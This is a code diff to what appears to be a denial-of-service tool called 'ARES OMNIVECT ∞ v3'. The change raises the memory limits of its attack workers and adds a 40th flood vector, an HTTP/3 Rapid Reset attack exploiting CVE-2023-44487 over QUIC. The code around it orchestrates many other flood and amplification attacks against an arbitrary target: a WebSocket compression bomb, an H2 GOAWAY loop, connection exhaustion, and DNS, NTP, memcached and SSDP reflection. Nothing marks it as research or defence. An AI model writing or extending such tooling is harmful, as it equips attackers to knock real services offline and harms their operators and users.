@@ -412,10 +412,10 @@ function spawnPool(
 
       // Heap cap per worker:
       // Deployed (8-32GB RAM): 1024MB → full power, workers rarely hit this ceiling.
-      // Dev (2GB total):       48MB  → 14 workers × 48 = 672MB max, safe.
+      // Dev (2GB total):       128MB → 14 workers × 128 = 1792MB, still safe on 4GB Replit.
       const workerOpts: import("worker_threads").WorkerOptions = {
         workerData: { method, target, port, threads: t, proxies },
-        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 1024 : 48 },
+        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 1024 : 128 },
       };
       const w = new Worker(WORKER_FILE, workerOpts);
       _activeWorkers++;
@@ -554,6 +554,7 @@ async function runAttackWorkers(
     const wcbW     = Math.max(2, Math.floor(CPU_COUNT / 2)); // ≥2 — WS Compression Bomb
     const goawayW  = Math.max(3, Math.floor(CPU_COUNT / 2)); // ≥3 — H2 GOAWAY Loop
     const sseW     = 1;                               // 1× SSE Exhaust (persistent conn hold)
+    const h3rrW    = Math.max(4, CPU_COUNT);          // ≥4 — H3 Rapid Reset (UDP, stateless, max parallelism)
     // L3/UDP — single worker with high socket concurrency
     const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
     const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;
@@ -602,6 +603,7 @@ async function runAttackWorkers(
     const wcbT     = Math.max(200,  Math.round(threads * 0.15)); // ★★★ WS Compression Bomb — 1820× decompress amplification
     const goawayT  = Math.max(300,  Math.round(threads * 0.22)); // ★★★ H2 GOAWAY Loop — 5000 teardown/setup cycles/s
     const sseT     = Math.max(200,  Math.round(threads * 0.10)); // SSE Exhaust — goroutine hold attack
+    const h3rrT    = Math.max(500,  Math.round(threads * 0.45)); // ★★★★★ H3 Rapid Reset — QUIC RESET_STREAM (UDP, unrate-limitable)
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -664,7 +666,8 @@ async function runAttackWorkers(
       spawnPool("ws-compression-bomb", target, port, wcbT,    wcbW,    signal, onStats),          // [v40] permessage-deflate 1820× amplification
       spawnPool("h2-goaway-loop",      target, port, goawayT, goawayW, signal, onStats),          // [v41] H2 GOAWAY Loop: 5000 TLS teardown/setup cycles/s
       spawnPool("sse-exhaust",         target, port, sseT,    sseW,    signal, makeGeassOnStats("sse")), // [v42] SSE Exhaust: 18K goroutine hold
-    ]); // Total: 39 ARES OMNIVECT ∞ v3 vectors
+      spawnPool("h3-rapid-reset",      target, 443,  h3rrT,   h3rrW,   signal, onStats),                 // [v43] H3 Rapid Reset: CVE-2023-44487 via QUIC/UDP (3-packet DCID burst)
+    ]); // Total: 40 ARES OMNIVECT ∞ v3 vectors
 
     // ── ADAPTIVE BURST MODE v2 — T003 RESPONSE CODE INTELLIGENCE ────────────
     // After 30s: fires BURST WAVES with randomized duration (8-22s ON, 3-10s REST).
